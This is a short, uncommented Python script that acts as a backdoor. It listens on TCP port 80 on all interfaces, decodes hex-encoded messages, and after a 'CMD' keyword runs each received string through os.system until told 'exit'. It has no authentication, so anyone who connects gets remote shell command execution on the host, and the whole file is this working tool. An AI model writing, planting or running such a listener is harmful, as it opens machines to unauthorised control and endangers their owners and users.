#!/usr/bin/env python3
import os
import socket
def main():
    sock = socket.create_server(('0.0.0.0', 80))
    sock.listen()
    while(True):
        connArray = sock.accept()
        conn = connArray[0]
        length = 1
        while(length > 0):
            hexMessage = conn.recv(4096).decode('utf-8')
            message = bytes.fromhex(hexMessage).decode('utf-8')
            if(message == 'CMD'):
                length = 1
                while(length != 0):
                    hexMessage = conn.recv(4096).decode('utf-8')
                    message = bytes.fromhex(hexMessage).decode('utf-8')
                    if(message.lower() == 'exit'):
                        length = 0
                    if(length != 0):
                        os.system(message)
main()